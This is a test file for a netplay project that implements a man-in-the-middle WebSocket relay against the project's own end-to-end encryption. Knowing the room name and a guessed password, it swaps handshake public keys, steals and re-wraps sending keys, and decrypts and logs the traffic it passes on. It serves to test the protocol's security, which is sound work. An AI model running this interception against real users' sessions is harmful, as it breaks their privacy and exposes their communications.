// A malicious relay for tests: a WebSocket proxy in front of the real relay that knows a room
// name (and optionally a password guess) and attacks the end-to-end encryption as a man in the
// middle. It replaces the ECDH public keys in the hello messages with its own, re-wraps the
// sending keys in the key messages, and so reads all data while passing it on unchanged.
// Without the room key (password not guessed) it can only pass everything on.
//
// Also usable on its own, e.g. to watch the attack with two browsers (Server: ws://localhost:8096):
//   node tests/netplay/mitm-relay.mjs 8096 "lan party doom" [password guess]

import { createServer } from 'node:http';
import { createHash } from 'node:crypto';
import { pathToFileURL } from 'node:url';

const root = new URL('../../site/js/', import.meta.url).href;
const { roomSecrets, sessionKeys, pairCipher, context, RoomCipher, importAesKey, toBase64, fromBase64 } = await import(root + 'netcrypt.js');

const enc = new TextEncoder();
const dec = new TextDecoder();
const hex = (b) => [...b].map((x) => x.toString(16).padStart(2, '0')).join('');
const fromHex = (h) => Uint8Array.from(h.match(/../g), (x) => parseInt(x, 16));

/**
 * @param {{port:number, room:string, guess?:string, upstream?:string, log?:(text:string)=>void}} o
 * @returns {Promise<{stats:object, read:string[], close:()=>void}>}
 */
export async function startMitm({ port, room, guess = '', upstream = 'ws://localhost:8090', log = () => {} }) {
  const secrets = await roomSecrets(room, guess);
  const M = await sessionKeys(); // the attacker's key pair, shown to everybody in place of the others
  const players = new Map(); // peer -> {session, pub} (the real keys)
  const sendKeys = new Map(); // peer -> stolen sending key
  const stats = { hellosSwapped: 0, keysStolen: 0, readMessages: 0, readPackets: 0, unreadable: 0 };
  const read = []; // plain text the attacker read

  async function unseal(cipher, kind, from, sealed) {
    const plain = await cipher.open(sealed, context(kind, from));
    return { head: plain.slice(0, 20), body: plain.slice(20), session: hex(plain.subarray(4, 12)) };
  }
  async function reseal(cipher, kind, from, head, body) {
    const plain = new Uint8Array(20 + body.length);
    plain.set(head);
    plain.set(body, 20);
    return cipher.seal(plain, context(kind, from));
  }

  /** A text message from the relay to `victim`: attack the handshake, read the data. */
  async function downstream(victim, text) {
    let msg;
    try { msg = JSON.parse(text); } catch { return text; }
    if (msg.type === 'joined') victim.peer = msg.peer;
    if (msg.type !== 'msg' || typeof msg.data !== 'string') return text;
    const from = msg.from;
    const sealed = fromBase64(msg.data.slice(1));
    if (msg.data[0] === 'S') { // data: read it with the stolen sending key, pass it on unchanged
      const k = sendKeys.get(from);
      try {
        if (!k) throw new Error('no key');
        const u = await unseal(k, 'm', from, sealed);
        stats.readMessages++;
        read.push(dec.decode(u.body));
        log(`READ message ${from} -> ${victim.peer}: ${dec.decode(u.body)}`);
      } catch { stats.unreadable++; }
      return text;
    }
    let u;
    try { u = await unseal(secrets.cipher, 'h', from, sealed); } catch { stats.unreadable++; return text; } // no room key
    const data = JSON.parse(dec.decode(u.body));
    if (data.netplay === 'hello') {
      players.set(from, { session: u.session, pub: fromBase64(data.pub) });
      data.pub = toBase64(M.pub); // the victim gets the attacker's key instead of the sender's
      stats.hellosSwapped++;
    } else if (data.netplay === 'key') {
      // Sealed by `from` with the pair key of its own key and "the victim's" key, which is M.
      const sender = players.get(from), target = players.get(victim.peer);
      if (!sender || !target) return text;
      const fromSender = await pairCipher(M.ecdh.privateKey, sender.pub, secrets.pairSalt, sender.session, target.session);
      const aad = context('k', fromHex(sender.session), fromHex(target.session));
      const raw = await fromSender.open(fromBase64(data.box), aad);
      if (!sendKeys.has(from)) {
        sendKeys.set(from, new RoomCipher(await importAesKey(raw)));
        stats.keysStolen++;
        log(`stole the sending key of peer ${from}`);
      }
      const toVictim = await pairCipher(M.ecdh.privateKey, target.pub, secrets.pairSalt, target.session, sender.session);
      data.box = toBase64(await toVictim.seal(raw, aad));
    } else return text;
    const out = await reseal(secrets.cipher, 'h', from, u.head, enc.encode(JSON.stringify(data)));
    return JSON.stringify({ ...msg, data: `R${toBase64(out)}` });
  }

  async function downstreamBinary(victim, buf) {
    if (victim.path.includes('/eth')) return buf;
    const from = new DataView(buf.buffer, buf.byteOffset).getUint32(0);
    const k = sendKeys.get(from);
    try {
      if (!k) throw new Error('no key');
      const u = await unseal(k, 'p', from, buf.slice(4));
      stats.readPackets++;
      if (stats.readPackets <= 3) log(`READ packet ${from} -> ${victim.peer}: ${u.body.length} bytes ${hex(u.body.subarray(0, 24))}…`);
      if (read.length < 1000) read.push(dec.decode(u.body));
    } catch { stats.unreadable++; }
    return buf;
  }

  /** The victim's own hello going up gives its real session and key (needed for the key boxes). */
  async function upstreamText(victim, text) {
    try {
      const msg = JSON.parse(text);
      if (msg.type === 'msg' && typeof msg.data === 'string' && msg.data[0] === 'R' && victim.peer) {
        const u = await unseal(secrets.cipher, 'h', victim.peer, fromBase64(msg.data.slice(1)));
        const data = JSON.parse(dec.decode(u.body));
        if (data.netplay === 'hello') players.set(victim.peer, { session: u.session, pub: fromBase64(data.pub) });
      }
    } catch { /* not readable for the attacker */ }
    return text;
  }

  const sockets = new Set();
  const server = createServer().on('upgrade', (req, socket) => {
    sockets.add(socket);
    const accept = createHash('sha1').update(`${req.headers['sec-websocket-key']}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest('base64');
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
    const victim = { peer: 0, path: req.url };
    const up = new WebSocket(upstream + req.url);
    up.binaryType = 'arraybuffer';
    const pending = [];
    let upChain = Promise.resolve();
    let downChain = Promise.resolve();
    up.onopen = () => { for (const p of pending.splice(0)) up.send(p); };
    up.onclose = () => socket.end();
    up.onerror = () => socket.destroy();
    up.onmessage = (e) => {
      const job = typeof e.data === 'string'
        ? downstream(victim, e.data).then((t) => frame(1, Buffer.from(t)))
        : downstreamBinary(victim, new Uint8Array(e.data)).then((b) => frame(2, Buffer.from(b)));
      downChain = downChain.then(() => job).then((f) => socket.write(f)).catch((err) => log(`error ${err.message}`));
    };
    const toUp = (data) => (up.readyState === WebSocket.OPEN ? up.send(data) : pending.push(data));
    readFrames(socket, (op, payload) => {
      if (op === 8) { socket.end(frame(8, Buffer.alloc(0))); up.close(); return; }
      if (op === 9) { socket.write(frame(10, payload)); return; }
      if (op === 1) {
        const text = payload.toString('utf8');
        upChain = upChain.then(() => upstreamText(victim, text)).then((t) => toUp(t));
      } else if (op === 2) upChain = upChain.then(() => toUp(new Uint8Array(payload)));
    });
    socket.on('close', () => { sockets.delete(socket); up.close(); });
    socket.on('error', () => up.close());
  });
  await new Promise((resolve) => server.listen(port, resolve));
  log(`malicious relay on ${port} in front of ${upstream}, attacking room "${room}"${guess ? ` with password guess "${guess}"` : ' (room name as key)'}`);
  return { stats, read, close: () => { for (const s of sockets) s.destroy(); server.close(); } };
}

// --- a minimal WebSocket server (no library) -----------------------------------------------

function frame(opcode, payload) {
  const len = payload.length;
  let head;
  if (len < 126) head = Buffer.from([0x80 | opcode, len]);
  else if (len < 65536) head = Buffer.from([0x80 | opcode, 126, len >> 8, len & 255]);
  else {
    head = Buffer.alloc(10);
    head[0] = 0x80 | opcode;
    head[1] = 127;
    head.writeBigUInt64BE(BigInt(len), 2);
  }
  return Buffer.concat([head, payload]);
}

/** Calls onMessage(opcode, payload) for every complete (unmasked, joined) message. */
function readFrames(socket, onMessage) {
  let buf = Buffer.alloc(0);
  let parts = [];
  let partOp = 0;
  socket.on('data', (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    for (;;) {
      if (buf.length < 2) return;
      const fin = buf[0] & 0x80, op = buf[0] & 15, masked = buf[1] & 0x80;
      let len = buf[1] & 127, off = 2;
      if (len === 126) { if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { if (buf.length < 10) return; len = Number(buf.readBigUInt64BE(2)); off = 10; }
      const mask = masked ? buf.subarray(off, off + 4) : null;
      if (masked) off += 4;
      if (buf.length < off + len) return;
      const payload = Buffer.from(buf.subarray(off, off + len));
      if (mask) for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3];
      buf = buf.subarray(off + len);
      if (op >= 8) { onMessage(op, payload); continue; } // control frames are never fragmented
      if (op !== 0) partOp = op;
      parts.push(payload);
      if (!fin) continue;
      const whole = Buffer.concat(parts);
      parts = [];
      onMessage(partOp, whole);
    }
  });
}

if (import.meta.url === pathToFileURL(process.argv[1]).href) {
  const [port = '8096', room = 'mitm test', guess = ''] = process.argv.slice(2);
  const m = await startMitm({ port: Number(port), room, guess, upstream: process.env.RELAY ?? 'ws://localhost:8090', log: (t) => console.log('[mitm]', t) });
  setInterval(() => console.log('[mitm] stats', JSON.stringify(m.stats)), 10000);
}
